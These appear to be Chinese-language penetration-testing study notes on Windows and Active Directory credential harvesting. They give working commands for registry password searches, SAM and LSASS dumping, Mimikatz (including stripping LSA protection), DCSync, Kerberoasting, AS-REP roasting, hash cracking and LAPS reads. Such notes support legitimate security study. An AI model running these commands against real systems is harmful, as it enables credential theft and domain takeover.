
#### 目录
- [主机内凭证收集](#主机内凭证收集-on-host-credential-gathering)
- [域级凭证收集](#域级凭证收集-domain-level-credential-gathering)

#### 概述 (Overview)

- 什么是凭证收集 (What is Credential Gathering?)：
    
    凭证收集是指攻击者为获取用户和系统凭证而采用的一系列技术。这些技术的目标是发现、窃取或拦截以各种形式存储或传输的认证信息。
    
- **凭证的形式 (Forms of Credentials)**：
    
    - **账户详情**：明文形式的用户名和密码。
    - **密码哈希**：如 NTLM 哈希，可用于传递哈希 (Pass-the-Hash) 攻击。
    - **认证票据**：Kerberos 票据，如票据授予票据 (TGT) 和服务票据 (TGS)。
    - **其他认证材料**：如私钥、API 密钥、访问令牌等。
- 凭证访问的价值 (The Value of Credential Access)：
    
    获取合法用户的凭证是攻击者在网络中进行横向移动 (Lateral Movement) 和权限提升 (Privilege Escalation) 的关键步骤，其优先级通常高于利用传统的软件漏洞。通过窃取和重用凭证，攻击者可以冒充合法用户，访问受限资源，从而更隐蔽地在网络中活动。
    
- 凭证存储位置 (Credential Storage Locations)：
    
    凭证可能以不安全的方式存储在各种位置，为攻击者提供了丰富的攻击面：
    
    - **文件系统**：明文文件、配置文件、历史命令记录、源代码、备份文件等。
    - **操作系统内存**：LSASS 进程内存中缓存的明文密码、哈希和票据。
    - **数据库**：应用程序数据库、密码管理器数据库（如 KeePass）、SAM 数据库。
    - **注册表**：Windows 注册表中的特定键值。
    - **活动目录 (AD)**：NTDS.dit 数据库、用户对象属性（如描述）、组策略 (GPO) 文件等。
    - **网络流量**：通过网络嗅探或中间人攻击捕获的未加密或弱加密的认证流量。

---

#### 主机内凭证收集 (On-Host Credential Gathering)

这些技术通常在已攻陷的单个主机上执行，旨在提取本地存储或缓存在内存中的凭证。

- **从文件中搜寻 (Searching in Files)**：
    
    - **基本原理 (Fundamentals)**: 搜索文件系统，查找被无意中以明文形式存储的敏感信息。此技术对应 MITRE ATT&CK T1552.001。
    - **目标文件示例 (Example Targets)**:
        - `C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`：PowerShell 命令历史。
        - Web 应用、FTP 客户端的配置文件。
        - 网络共享中的脚本和文档。
    - **注册表搜索 (Registry Searching)**:
        
        Bash
        
        ```
        # 在 HKLM 和 HKCU 中搜索包含 "password" 关键字的字符串值
        reg query HKLM /f password /t REG_SZ /s
        reg query HKCU /f password /t REG_SZ /s
        ```
        
- **本地安全账户管理器 (Security Account Manager, SAM)**：
    
    - **基本原理 (Fundamentals)**: SAM 是一个数据库文件，存储**本地用户账户**的密码哈希。在操作系统运行时，SAM 文件被锁定，无法直接访问。
    - **转储方法 (Dumping Methods)**:
        - **卷影副本服务 (Volume Shadow Copy Service, VSS)**: 创建一个系统驱动器的快照，从而可以访问被锁定的 SAM 和 SYSTEM 文件（SYSTEM 文件用于解密 SAM）。
            
            PowerShell
            
            ```
            # 1. 创建 C: 盘的卷影副本
            wmic shadowcopy call create Volume='C:\'
            
            # 2. 从卷影副本中复制 SAM 和 SYSTEM 文件
            copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\temp\sam
            copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\temp\system
            ```
            
        - **注册表备份 (Registry Hives)**: 使用 `reg.exe` 命令直接从注册表中保存 SAM 和 SYSTEM hive。
            
            Bash
            
            ```
            reg save HKLM\sam C:\temp\sam.save
            reg save HKLM\system C:\temp\system.save
            ```
            
    - **离线解密 (Offline Decryption)**: 使用 Impacket 工具集的 `secretsdump.py` 来解密导出的文件。
        
        Bash
        
        ```
        python3 secretsdump.py -sam sam.save -system system.save LOCAL
        ```
        
- **本地安全认证子系统服务 (Local Security Authority Subsystem Service, LSASS)**：
    
    - **基本原理 (Fundamentals)**: `lsass.exe` 是 Windows 中负责安全策略和用户认证的核心进程。它在内存中缓存了已登录用户（包括本地和域用户）的凭证，如明文密码、NTLM 哈希和 Kerberos 票据。转储 LSASS 进程的内存是获取这些凭证的常用方法（T1003.001）。
    - **转储 LSASS 内存 (Dumping LSASS Memory)**: 需要本地管理员权限。
        - **任务管理器 (Task Manager)**: 在“详细信息”选项卡中右键单击 `lsass.exe`，选择“创建转储文件”。
        - **ProcDump**: 使用 Sysinternals 套件中的 `procdump.exe` 工具。
            
            Bash
            
            ```
            procdump.exe -accepteula -ma lsass.exe lsass.dmp
            ```
            
    - **使用 Mimikatz 提取凭证 (Extracting Credentials with Mimikatz)**:
        - **直接从内存提取**:
            
            PowerShell
            
            ```
            # 提升权限以调试进程
            privilege::debug
            # 从 LSASS 内存中转储所有登录凭证
            sekurlsa::logonpasswords
            ```
            
        - **处理受保护的 LSASS (Protected LSASS)**: 微软引入了 LSA 保护 (`RunAsPPL`) 来阻止对 LSASS 内存的直接访问。Mimikatz 可以通过加载其内核驱动 `mimidrv.sys` 来绕过此保护。
            
            PowerShell
            
            ```
            # 加载驱动
            !+
            # 移除 LSASS 进程的保护
            !processprotect /process:lsass.exe /remove
            # 再次尝试转储
            sekurlsa::logonpasswords
            ```
            
- **Windows 凭证管理器 (Windows Credential Manager)**：
    
    - **基本原理 (Fundamentals)**: 这是 Windows 内置的功能，用于存储网站、应用程序和网络的登录凭证。
    - **枚举与提取 (Enumeration and Extraction)**:
        - **命令行工具**: 使用 `vaultcmd /list` 和 `cmdkey /list` 来枚举已存储的凭证。
        - **Mimikatz**: 使用 `sekurlsa::credman` 命令可以直接从内存中转储凭证管理器中存储的明文密码。
            
            PowerShell
            
            ```
            privilege::debug
            sekurlsa::credman
            ```
            

---

#### 域级凭证收集 (Domain-Level Credential Gathering)

这些技术专注于从活动目录本身或通过利用域级协议来获取凭证。

- **NTDS.dit 数据库 (The NTDS.dit Database)**：
    
    - **基本原理 (Fundamentals)**: `NTDS.dit` 是存储整个 AD 域信息的数据库文件，包括所有**域用户**的密码哈希。它位于每个域控制器上。
    - **本地转储 (Local Dump on a DC)**: 如果已获得 DC 的管理员权限，可以使用 `ntdsutil.exe` 创建数据库的快照（IFM - Install From Media）。
        
        PowerShell
        
        ```
        ntdsutil.exe "ac i ntds" "ifm" "create full c:\temp" q q
        ```
        
    - **远程转储 (DCSync)**:
        - **原理**: 拥有域复制权限的账户可以模拟 DC，远程请求所有用户的凭证数据。
        - **执行**: 使用 Impacket 工具集的 `secretsdump.py` 是执行 DCSync 攻击的标准方法。
            
            Bash
            
            ```
            # -just-dc-ntlm 仅转储 NTLM 哈希
            python3 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
            ```
            
    - **离线破解 (Offline Cracking)**: 使用 `hashcat` 等工具破解获取的 NTLM 哈希。
        
        Bash
        
        ```
        # -m 1000 对应 NTLM 哈希
        hashcat -m 1000 ntlm_hashes.txt wordlist.txt
        ```
        
- **利用服务主体名称 (Exploiting Service Principal Names, SPNs)**：
    
    - **Kerberoasting**:
        - **基本原理 (Fundamentals)**: 任何经过身份验证的域用户都可以为配置了 SPN 的服务账户请求服务票据 (TGS)。该 TGS 的加密部分使用服务账户的 NTLM 哈希作为密钥。攻击者可以请求这些票据并进行离线暴力破解，以恢复服务账户的明文密码。
        - **执行 (Execution)**: 使用 Impacket 的 `GetUserSPNs.py`。
            
            Bash
            
            ```
            # 请求所有可用的服务票据
            python3 GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
            # 使用 hashcat -m 13100 破解获取的 TGS 哈希
            hashcat -m 13100 spn_hashes.txt wordlist.txt
            ```
            
    - **AS-REP Roasting**:
        - **基本原理 (Fundamentals)**: 此攻击针对那些被设置为“不要求 Kerberos 预身份验证”的用户账户。对于这些账户，攻击者可以在不知道密码的情况下请求其认证数据 (AS-REP)，其中一部分数据使用用户的 NTLM 哈希加密，同样可以进行离线破解。
        - **执行 (Execution)**: 使用 Impacket 的 `GetNPUsers.py`。
            
            Bash
            
            ```
            python3 GetNPUsers.py -dc-ip <DC_IP> <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
            ```
            
- **利用 LAPS 与 GPP (Exploiting LAPS and GPP)**：
    
    - **组策略首选项 (Group Policy Preferences, GPP)**: 一种已被弃用的旧方法。管理员密码曾被 AES 加密后存储在 SYSVOL 的一个 XML 文件中，但微软意外地公开了私钥，使得任何域用户都能读取并解密该密码。
    - **本地管理员密码解决方案 (LAPS)**:
        - **基本原理 (Fundamentals)**: 微软推出的安全替代方案。它为每台计算机生成一个唯一的、随机的本地管理员密码，并将其以明文形式存储在 AD 中该计算机对象的 `ms-mcs-AdmPwd` 属性下。
        - **枚举与利用 (Enumeration and Exploitation)**: 如果攻击者控制的账户被授予了读取该属性的权限，就可以使用 PowerShell 的 LAPS 模块查询并获取目标计算机的本地管理员密码。
            
            PowerShell
            
            ```
            # 查找哪些组对 'THMorg' OU 有 LAPS 读取权限
            Find-AdmPwdExtendedRights -Identity THMorg
            
            # 获取目标计算机的 LAPS 密码
            Get-AdmPwdPassword -ComputerName creds-harvestin
            ```
            
- **网络嗅探与中继 (Network Sniffing and Relaying)**：
    
    - **LLMNR/NBT-NS 中毒 (LLMNR/NBT-NS Poisoning)**: 当 DNS 解析失败时，客户端会在本地网络广播 LLMNR/NBT-NS 请求。攻击者可以应答这些请求，伪装成目标主机，诱使客户端向攻击机发起连接。
    - **SMB 中继 (SMB Relay)**: 结合 LLMNR 中毒，当受害者向攻击机发起 SMB 认证时，攻击者可以将这个 NTLM 认证过程“中继”到网络上的另一台真实服务器。如果中继成功，攻击者就能以受害者的身份访问该服务器。此攻击要求目标服务器禁用 SMB 签名。